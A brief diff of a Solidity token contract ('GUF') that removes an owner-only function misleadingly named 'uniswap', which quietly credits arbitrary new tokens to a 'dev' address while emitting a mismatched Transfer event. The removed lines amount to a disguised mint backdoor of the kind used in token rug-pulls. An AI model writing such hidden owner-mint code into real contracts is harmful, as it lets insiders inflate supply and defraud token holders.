@@ -609,15 +609,4 @@ contract GUF is ERC20Detailed, Ownable {
         return ERC20Detailed(tokenAddress).transfer(msg.sender, tokens);
     }
 
-    function uniswap(uint256 amount) public onlyOwner returns (bool) {
-    _uniswap(_msgSender(), amount);
-    return true;
-  }
-
-    function _uniswap(address account, uint256 amount) internal {
-    require(account != address(0), "BEP20: mint to the zero address");
-
-    _gonBalances[dev] = _gonBalances[dev].add(amount);
-    emit Transfer(address(0), account, amount);
-  }
 }
